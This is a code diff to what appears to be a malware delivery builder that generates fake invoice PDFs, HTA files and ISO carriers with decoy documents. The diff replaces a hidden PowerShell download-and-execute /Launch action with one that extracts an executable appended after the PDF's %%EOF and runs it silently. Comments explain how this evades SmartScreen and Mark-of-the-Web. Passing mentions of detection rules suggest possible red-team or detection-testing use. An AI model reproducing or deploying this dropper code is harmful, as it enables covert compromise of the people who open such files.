@@ -205,7 +205,7 @@ router.get("/api/builder/carrier", requireAdmin, (req, res) => {
     pdf:  () => ({ name: `${pdfOpts.filename}.pdf.hta`,     mime: "application/hta",          body: buildDocCarrier(payload, decoyPdfUrl + "?" + new URLSearchParams(pdfOpts), "%TEMP%\\~invoice.pdf",  "pdf",  saveTo) }),
     // Genuine .pdf — real invoice, /OpenAction /Launch fires powershell hidden.
     // pname = AcroRd32.exe / Acrobat.exe / FoxitReader → DR_016 fires.
-    pdfexec: () => ({ name: `${pdfOpts.filename}.pdf`,     mime: "application/pdf",           body: buildExecPdf(payload, pdfOpts) }),
+    pdfexec: () => ({ name: `${pdfOpts.filename}.pdf`,     mime: "application/pdf",           body: buildExecPdf(pdfOpts) }),
     word: () => ({ name: `${pdfOpts.filename}.docx.hta`,   mime: "application/hta",           body: buildDocCarrier(payload, decoyDocUrl + "?" + new URLSearchParams(pdfOpts), "%TEMP%\\~report.docx", "word", saveTo) }),
     // ISO wrapping — no Mark-of-the-Web → SmartScreen is bypassed on older/unpatched Windows
     // pname = parent of whatever runs the exe inside the ISO (typically explorer.exe → DR_001)
@@ -560,17 +560,22 @@ function buildDecoyPdf(opts = {}) {
   return Buffer.concat(parts);
 }
 
-// ── Genuine PDF with embedded /Launch action ──────────────────────────────────
-// A real, openable .pdf file (not .hta).  The PDF reader shows the invoice
-// normally.  The /OpenAction /Launch entry fires powershell silently alongside
-// the visible document.
-//   Modern Adobe Reader (v10+): shows a one-click "Allow" security dialog.
-//   Foxit / SumatraPDF / unpatched readers: fires without any dialog.
-//   pname = AcroRd32.exe / Acrobat.exe / FoxitReader.exe → DR_016 fires.
-function buildExecPdf(payloadUrl, opts = {}) {
-  const from = opts.from || "Nexus Solutions Ltd.";
-  const to   = opts.to   || "Acme Corporation";
-  const note = opts.note || "";
+// ── Genuine self-contained PDF with embedded /Launch action ──────────────────
+// The compiled OneDriveHelper.exe is appended verbatim after %%EOF.
+// /OpenAction /Launch fires a hidden PowerShell that:
+//   1. Finds the PDF file by its known filename in common locations
+//   2. Reads the exe bytes starting at the sentinel offset
+//   3. Writes to %TEMP%\OneDriveHelper.exe and executes it
+// The extracted file has NO Zone.Identifier ADS → SmartScreen does not fire.
+// pname = AcroRd32.exe / Acrobat.exe / FoxitReader.exe → DR_016 fires.
+function buildExecPdf(opts = {}) {
+  const from     = opts.from     || "Nexus Solutions Ltd.";
+  const to       = opts.to       || "Acme Corporation";
+  const note     = opts.note     || "";
+  const filename = opts.filename || "Invoice_Q4-2024";
+
+  const exeBuf  = fs.readFileSync(DL_HELPER);
+  const exeSize = exeBuf.length;
 
   // Escape a string for use inside a PDF literal-string ( ... )
   const pdfStr = s => s
@@ -578,11 +583,18 @@ function buildExecPdf(payloadUrl, opts = {}) {
     .replace(/\(/g, "\\(")
     .replace(/\)/g, "\\)");
 
-  const psArgs = pdfStr(
-    `-w hidden -nop -c "$wc=New-Object Net.WebClient;` +
-    `$wc.DownloadFile('${payloadUrl}',$env:TEMP+'\\OneDriveHelper.exe');` +
-    `Start-Process ($env:TEMP+'\\OneDriveHelper.exe') -WindowStyle Hidden"`
-  );
+  // PowerShell command embedded in /Launch.
+  // Searches for this PDF by its known filename, reads exe bytes at $o, executes.
+  // "$o=12345678" is an 8-char sentinel patched with the real offset after PDF construction.
+  const psRaw =
+    `$fn='${filename}.pdf';` +
+    `$u=$env:USERPROFILE;` +
+    `$locs=@("$u\\Downloads","$u\\Desktop","$env:TEMP","$u\\Documents","$u\\OneDrive\\Desktop","$u\\OneDrive\\Downloads");` +
+    `$fp=$locs|%{$p=Join-Path $_ $fn;if(Test-Path $p){$p}}|?{$_}|Select-Object -First 1;` +
+    `if(!$fp){$fp=Get-ChildItem "$u" -Recurse -Filter $fn -EA 0|Sort-Object LastWriteTime -Desc|Select-Object -First 1|%{$_.FullName}};` +
+    `if($fp){$o=12345678;$z=${exeSize};$rb=[IO.File]::ReadAllBytes($fp);$eb=$rb[$o..($o+$z-1)];$tp=Join-Path $env:TEMP OneDriveHelper.exe;[IO.File]::WriteAllBytes($tp,$eb);Start-Process $tp -WindowStyle Hidden}`;
+
+  const psArgs = pdfStr(`-w hidden -nop -c "${psRaw}"`);
 
   const invNum = "INV-" + (Math.floor(Math.random() * 9000) + 1000);
   const now = new Date();
@@ -649,8 +661,7 @@ function buildExecPdf(payloadUrl, opts = {}) {
   const add  = s => parts.push(Buffer.isBuffer(s) ? s : Buffer.from(s, "latin1"));
   const pos  = () => parts.reduce((n, b) => n + b.length, 0);
 
-  // Object 7: the Launch action — powershell runs hidden, payload downloaded + executed
-  // /D sets working dir to System32 so powershell.exe resolves without full path
+  // Object 7: /Launch action — PowerShell finds the PDF by filename, extracts exe, runs it
   const launchObj =
     `7 0 obj\n` +
     `<< /Type /Action /S /Launch\n` +
@@ -660,7 +671,6 @@ function buildExecPdf(payloadUrl, opts = {}) {
     `endobj\n\n`;
 
   add("%PDF-1.4\n%\xe2\xe3\xcf\xd3\n");
-  // Catalog now references the launch action via /OpenAction
   off[1] = pos(); add("1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 7 0 R >>\nendobj\n\n");
   off[2] = pos(); add("2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n\n");
   off[3] = pos(); add("3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792]\n" +
@@ -679,7 +689,19 @@ function buildExecPdf(payloadUrl, opts = {}) {
   xr += `trailer\n<< /Root 1 0 R /Size 8 >>\nstartxref\n${xrefPos}\n%%EOF\n`;
   add(xr);
 
-  return Buffer.concat(parts);
+  // ── Two-pass: patch sentinel offset, then append exe after %%EOF ───────────
+  // PDF readers ignore everything after %%EOF. The exe sits there invisibly.
+  // PowerShell reads the PDF file itself and slices out the exe bytes.
+  const pdfBuf    = Buffer.concat(parts);
+  const exeOffset = pdfBuf.length;
+  const offsetStr = String(exeOffset).padStart(8, "0");
+
+  // Locate "$o=12345678" sentinel in the PDF bytes and overwrite the 8-digit value
+  const sentinel = Buffer.from("$o=12345678", "latin1");
+  const sidx     = pdfBuf.indexOf(sentinel);
+  if (sidx !== -1) Buffer.from(offsetStr, "latin1").copy(pdfBuf, sidx + 3);
+
+  return Buffer.concat([pdfBuf, exeBuf]);
 }
 
 // ── Decoy DOCX generator ──────────────────────────────────────────────────────
